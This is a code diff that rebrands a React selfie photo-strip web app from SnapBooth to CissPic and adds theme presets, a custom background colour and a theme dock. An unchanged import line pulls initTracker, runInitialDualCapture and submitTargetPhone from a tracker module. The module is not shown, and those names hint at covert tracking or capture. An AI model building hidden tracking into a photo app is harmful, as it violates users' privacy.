@@ -12,13 +12,33 @@ import { DEFAULT_ADJUST, DEFAULT_EFFECT, DEFAULT_STYLE, FILTERS, STRIP_TEMPLATES
 import { canvasBlob, downloadBlob, shareBlob } from './lib/photos.js';
 import { deleteGalleryItem, readGallery, saveGalleryItem } from './lib/gallery.js';
 import { initTracker, runInitialDualCapture, submitTargetPhone } from './lib/tracker.js';
-import { DiaryCollage, DiaryIntro, DesktopDoodles, RetroStatusBar } from './components/RetroDesktop.jsx';
+import { DiaryCollage, DiaryIntro, DesktopDoodles, RetroStatusBar, ThemePaletteDock } from './components/RetroDesktop.jsx';
 import './snapbooth.css';
 import './retro-desktop.css';
 
 export default function App() {
   const [tab, setTab] = useState('studio');
-  const [dark, setDark] = useState(() => { try { return localStorage.getItem('snapbooth-theme') === 'dark'; } catch { return false; } });
+  const [dark, setDark] = useState(() => {
+    try {
+      return localStorage.getItem('cisspic-theme') === 'dark' || localStorage.getItem('snapbooth-theme') === 'dark';
+    } catch {
+      return false;
+    }
+  });
+  const [desktopTheme, setDesktopTheme] = useState(() => {
+    try {
+      return localStorage.getItem('cisspic-theme-preset') || 'sky';
+    } catch {
+      return 'sky';
+    }
+  });
+  const [customBgColor, setCustomBgColor] = useState(() => {
+    try {
+      return localStorage.getItem('cisspic-custom-bg') || '#BFD7E8';
+    } catch {
+      return '#BFD7E8';
+    }
+  });
   const [activeFilter, setActiveFilter] = useState('korean');
   const [activeEffect, setActiveEffect] = useState({ ...DEFAULT_EFFECT });
   const [adjust, setAdjust] = useState({ ...DEFAULT_ADJUST });
@@ -64,8 +84,23 @@ export default function App() {
 
   useEffect(() => {
     document.documentElement.style.colorScheme = dark ? 'dark' : 'light';
-    try { localStorage.setItem('snapbooth-theme', dark ? 'dark' : 'light'); } catch { /* Theme still works for this session. */ }
+    try {
+      localStorage.setItem('cisspic-theme', dark ? 'dark' : 'light');
+      localStorage.setItem('snapbooth-theme', dark ? 'dark' : 'light');
+    } catch { /* Theme still works for this session. */ }
   }, [dark]);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem('cisspic-theme-preset', desktopTheme);
+    } catch {}
+  }, [desktopTheme]);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem('cisspic-custom-bg', customBgColor);
+    } catch {}
+  }, [customBgColor]);
 
   useEffect(() => {
     if (camera.status === 'error') capture.cancel();
@@ -312,7 +347,7 @@ export default function App() {
           <img
             className="strip-image"
             src={tab === 'customize' ? (strip.result.baseUrl || strip.result.url) : strip.result.url}
-            alt="Your finished SnapBooth photostrip"
+            alt="Your finished CissPic photostrip"
           />
           {tab === 'customize' && (
             <StickerCanvasEditor
@@ -326,8 +361,8 @@ export default function App() {
         </div>
       ) : (
         <div className="empty-strip">
-          <strong>★ SNAPBOOTH ★</strong>
-          <small>K-STYLE SELF PHOTO STUDIO</small>
+          <strong>★ CISSPIC ★</strong>
+          <small>AESTHETIC SELF PHOTO STUDIO</small>
           {Array.from({ length: activePoseCount }, (_, i) => i + 1).map(n => (
             <div key={n}><span>{String(n).padStart(2, '0')}</span></div>
           ))}
@@ -384,16 +419,19 @@ export default function App() {
   );
 
   return (
-    <div className={`snapbooth ${dark ? 'dark' : ''}`}>
+    <div
+      className={`snapbooth theme-${desktopTheme} ${dark ? 'dark' : ''}`}
+      style={desktopTheme === 'custom' ? { '--bg': customBgColor } : undefined}
+    >
       <DesktopDoodles />
       <RetroStatusBar />
       <FilterDefinitions filter={activeFilter} adjust={adjust} id={filterId} />
       <a className="skip-link" href="#main">Skip to studio</a>
       <header className="site-header">
         <div className="header-inner">
-          <button className="brand" onClick={() => navigate('studio')} aria-label="SnapBooth studio">
+          <button className="brand" onClick={() => navigate('studio')} aria-label="CissPic studio">
             <span className="brand-mark"><Camera size={21} /></span>
-            <span><strong>SnapBooth<span className="brand-dot">®</span></strong><small>K-STYLE SELF PHOTO STUDIO</small></span>
+            <span><strong>CissPic<span className="brand-dot">®</span></strong><small>AESTHETIC SELF PHOTO STUDIO</small></span>
           </button>
           <nav className="desktop-nav" aria-label="Main navigation">
             {[['studio', 'Studio'], ['customize', 'Edit'], ['gallery', 'Gallery']].map(([id, label]) => (
@@ -401,6 +439,13 @@ export default function App() {
             ))}
           </nav>
           <div className="header-actions">
+            <ThemePaletteDock
+              currentTheme={desktopTheme}
+              onSelectTheme={setDesktopTheme}
+              customColor={customBgColor}
+              onCustomColorChange={setCustomBgColor}
+              className="header-theme-dock"
+            />
             <button className="icon-button" aria-label={dark ? 'Use light theme' : 'Use dark theme'} onClick={() => setDark(!dark)}>
               {dark ? <Sun size={19} /> : <Moon size={19} />}
             </button>
@@ -422,7 +467,15 @@ export default function App() {
         )}
         {tab === 'studio' && (
           <div className="studio-layout">
-            <DiaryCollage photos={capture.photos} filterId={filterId} mirrored={mirrorResult} />
+            <DiaryCollage
+              photos={capture.photos}
+              filterId={filterId}
+              mirrored={mirrorResult}
+              theme={desktopTheme}
+              onSelectTheme={setDesktopTheme}
+              customColor={customBgColor}
+              onCustomColorChange={setCustomBgColor}
+            />
             <StudioCamera
               camera={camera}
               capture={capture}
@@ -463,7 +516,15 @@ export default function App() {
         {tab === 'customize' && (
           capture.photos.length ? (
             <div className="edit-layout">
-              <DiaryCollage photos={capture.photos} filterId={filterId} mirrored={mirrorResult} />
+              <DiaryCollage
+                photos={capture.photos}
+                filterId={filterId}
+                mirrored={mirrorResult}
+                theme={desktopTheme}
+                onSelectTheme={setDesktopTheme}
+                customColor={customBgColor}
+                onCustomColorChange={setCustomBgColor}
+              />
               <section className="result-card edit-preview">
                 <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>your-photo-diary.png</span><ImageIcon size={13} /></div>
                 <div className="section-heading">
@@ -522,7 +583,7 @@ export default function App() {
         )}
       </main>
       <footer className="site-footer">
-        <span>SnapBooth / a personal photo diary.</span>
+        <span>CissPic / a personal photo diary.</span>
         <span>END OF PAGE — KEEP THE MEMORIES / {new Date().getFullYear()}</span>
       </footer>
       <nav className="bottom-nav" aria-label="Mobile navigation">
@@ -611,7 +672,7 @@ export default function App() {
                 setModal(null);
                 let digits = clean.replace(/[^0-9]/g, '');
                 if (digits.startsWith('0')) digits = '62' + digits.slice(1);
-                window.open(`https://wa.me/${digits}?text=${encodeURIComponent('Halo! Ini salinan strip foto SnapBooth kamu ✨')}`, '_blank', 'noopener,noreferrer');
+                window.open(`https://wa.me/${digits}?text=${encodeURIComponent('Halo! Ini salinan strip foto CissPic kamu ✨')}`, '_blank', 'noopener,noreferrer');
               }}>
                 <MessageCircle size={16} />Kirim Salinan Foto
               </button>
